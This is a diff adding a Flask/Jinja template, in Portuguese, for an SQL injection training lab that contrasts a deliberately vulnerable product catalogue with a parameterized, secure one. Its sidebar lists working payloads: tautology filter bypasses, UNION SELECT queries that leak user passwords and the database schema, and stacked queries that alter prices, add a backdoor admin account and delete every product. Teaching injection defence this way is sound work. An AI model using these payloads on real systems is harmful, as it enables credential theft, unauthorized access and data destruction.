@@ -1,0 +1,197 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="grid-2">
+    <div>
+        <!-- Card de Listagem e Filtro -->
+        <div class="card">
+            <h2>
+                {% if modo == 'vuln' %}
+                    🔓 Catálogo de Produtos (Filtro Vulnerável)
+                {% else %}
+                    🛡️ Catálogo de Produtos (Filtro Seguro)
+                {% endif %}
+            </h2>
+            <p class="subtitle">
+                {% if modo == 'vuln' %}
+                    Rota <code>GET /vuln/produtos?filtro=...</code>: Interpola a busca diretamente no <code>LIKE '%...%'</code>.
+                {% else %}
+                    Rota <code>GET /seguro/produtos?filtro=...</code>: Utiliza consulta parametrizada <code>LIKE ?</code>.
+                {% endif %}
+            </p>
+
+            <form method="GET" action="{{ url_for(modo + '_produtos') }}" style="display: flex; gap: 0.5rem; margin-bottom: 1rem;">
+                <input
+                    type="text"
+                    id="filtro"
+                    name="filtro"
+                    value="{{ filtro }}"
+                    class="form-control"
+                    placeholder="Filtrar produtos por nome..."
+                >
+                <button type="submit" class="btn {% if modo == 'vuln' %}btn-vuln{% else %}btn-seguro{% endif %}">
+                    Filtrar
+                </button>
+                {% if filtro %}
+                    <a href="{{ url_for(modo + '_produtos') }}" class="btn btn-outline" style="display:flex;align-items:center;">Limpar</a>
+                {% endif %}
+            </form>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Nome</th>
+                        <th>Valor (R$)</th>
+                        <th>Descrição</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for p in produtos %}
+                        <tr>
+                            <td>{{ p[0] }}</td>
+                            <td><strong>{{ p[1] }}</strong></td>
+                            <td>
+                                {% if p[2] is number %}
+                                    R$ {{ "%.2f"|format(p[2]) }}
+                                {% else %}
+                                    <code>{{ p[2] }}</code>
+                                {% endif %}
+                            </td>
+                            <td>{{ p[3] }}</td>
+                        </tr>
+                    {% else %}
+                        <tr>
+                            <td colspan="4" style="text-align: center; color: var(--text-muted);">
+                                Nenhum produto encontrado para o filtro informado.
+                            </td>
+                        </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Card de Insercao de Produto -->
+        <div class="card">
+            <h2>
+                {% if modo == 'vuln' %}
+                    🔓 Cadastrar Novo Produto (Inserção Vulnerável)
+                {% else %}
+                    🛡️ Cadastrar Novo Produto (Inserção Segura)
+                {% endif %}
+            </h2>
+            <p class="subtitle">
+                {% if modo == 'vuln' %}
+                    Rota <code>POST /vuln/produtos/novo</code>: Usa f-string + <code>executescript()</code>, permitindo injeção de múltiplos comandos (Stacked Queries).
+                {% else %}
+                    Rota <code>POST /seguro/produtos/novo</code>: Valida tipos numéricos e usa <code>cursor.execute()</code> parametrizado.
+                {% endif %}
+            </p>
+
+            <form method="POST" action="{{ url_for(modo + '_novo_produto') }}">
+                <div class="form-group">
+                    <label for="nome">Nome do Produto</label>
+                    <input type="text" id="nome" name="nome" class="form-control" placeholder="Ex: Antivírus Endpoint EDR" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="valor">Valor (R$)</label>
+                    <input type="text" id="valor" name="valor" class="form-control" placeholder="Ex: 450.00" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="descricao">Descrição</label>
+                    <input type="text" id="descricao" name="descricao" class="form-control" placeholder="Descrição detalhada do produto" required>
+                </div>
+
+                <button type="submit" class="btn {% if modo == 'vuln' %}btn-vuln{% else %}btn-seguro{% endif %}">
+                    Inserir Produto ({{ modo | upper }})
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Coluna Lateral: Payloads de SQL Injection -->
+    <div>
+        <div class="card">
+            <h2>🧪 Payloads para o Filtro (GET)</h2>
+            <p class="subtitle">Explore vazamento de dados (Confidencialidade) através do campo de filtro.</p>
+
+            <div class="payload-item">
+                <h4>1. Tautologia: Exibir Produtos Ocultos (visivel=0)</h4>
+                <p>Ignora o filtro <code>visivel = 1</code> e lista itens restritos cadastrados no banco.</p>
+                <code class="payload-code">' OR 1=1 --</code>
+                <button type="button" class="btn btn-outline" onclick="preencherFiltro(&quot;' OR 1=1 --&quot;)">
+                    ⚡ Preencher no Filtro
+                </button>
+            </div>
+
+            <div class="payload-item">
+                <h4>2. UNION SELECT: Vazar Credenciais de Usuários</h4>
+                <p>Combina o resultado da busca de produtos com a tabela <code>usuarios</code>, expondo senhas em texto claro.</p>
+                <code class="payload-code">' UNION SELECT id, username, password, role FROM usuarios --</code>
+                <button type="button" class="btn btn-outline" onclick="preencherFiltro(&quot;' UNION SELECT id, username, password, role FROM usuarios --&quot;)">
+                    ⚡ Preencher no Filtro
+                </button>
+            </div>
+
+            <div class="payload-item">
+                <h4>3. UNION SELECT: Mapear Estrutura do Banco (sqlite_master)</h4>
+                <p>Extrai o nome e o DDL (<code>CREATE TABLE</code>) de todas as tabelas do SQLite.</p>
+                <code class="payload-code">' UNION SELECT 1, name, type, sql FROM sqlite_master WHERE type='table' --</code>
+                <button type="button" class="btn btn-outline" onclick="preencherFiltro(&quot;' UNION SELECT 1, name, type, sql FROM sqlite_master WHERE type='table' --&quot;)">
+                    ⚡ Preencher no Filtro
+                </button>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>💥 Payloads para Inserção (POST)</h2>
+            <p class="subtitle">Explore violação de Integridade e Disponibilidade no cadastro de produtos.</p>
+
+            <div class="payload-item">
+                <h4>4. Stacked Query: Adulterar Preços de Todos os Produtos</h4>
+                <p>Fecha o <code>INSERT</code> atual e injeta um <code>UPDATE</code> alterando o valor de todo o catálogo para R$ 0.01.</p>
+                <code class="payload-code">Descrição: Item'); UPDATE produtos SET valor = 0.01; --</code>
+                <button type="button" class="btn btn-outline" onclick="preencherInsercao('Cabo de Rede Cat6', '25.00', &quot;Item'); UPDATE produtos SET valor = 0.01; --&quot;)">
+                    ⚡ Preencher no Cadastro
+                </button>
+            </div>
+
+            <div class="payload-item">
+                <h4>5. Stacked Query: Criar Usuário Administrador Backdoor</h4>
+                <p>Injeta um <code>INSERT</code> secundário na tabela <code>usuarios</code> criando a conta <code>hacker / pwned</code> com perfil <code>admin</code>.</p>
+                <code class="payload-code">Descrição: Normal'); INSERT INTO usuarios (username, password, role) VALUES ('hacker', 'pwned', 'admin'); --</code>
+                <button type="button" class="btn btn-outline" onclick="preencherInsercao('Mouse USB', '40.00', &quot;Normal'); INSERT INTO usuarios (username, password, role) VALUES ('hacker', 'pwned', 'admin'); --&quot;)">
+                    ⚡ Preencher no Cadastro
+                </button>
+            </div>
+
+            <div class="payload-item">
+                <h4>6. Stacked Query (Negação de Serviço): Apagar Produtos</h4>
+                <p>Injeta um <code>DELETE FROM produtos;</code> apagando todos os registros (use o botão <strong>Resetar Banco</strong> no topo para restaurar!).</p>
+                <code class="payload-code">Descrição: Boom'); DELETE FROM produtos; --</code>
+                <button type="button" class="btn btn-outline" onclick="preencherInsercao('Teste DoS', '10.00', &quot;Boom'); DELETE FROM produtos; --&quot;)">
+                    ⚡ Preencher no Cadastro
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function preencherFiltro(valor) {
+    const input = document.getElementById('filtro');
+    input.value = valor;
+    input.focus();
+}
+
+function preencherInsercao(nome, valor, descricao) {
+    document.getElementById('nome').value = nome;
+    document.getElementById('valor').value = valor;
+    const descInput = document.getElementById('descricao');
+    descInput.value = descricao;
+    descInput.focus();
+}
+</script>
+{% endblock %}
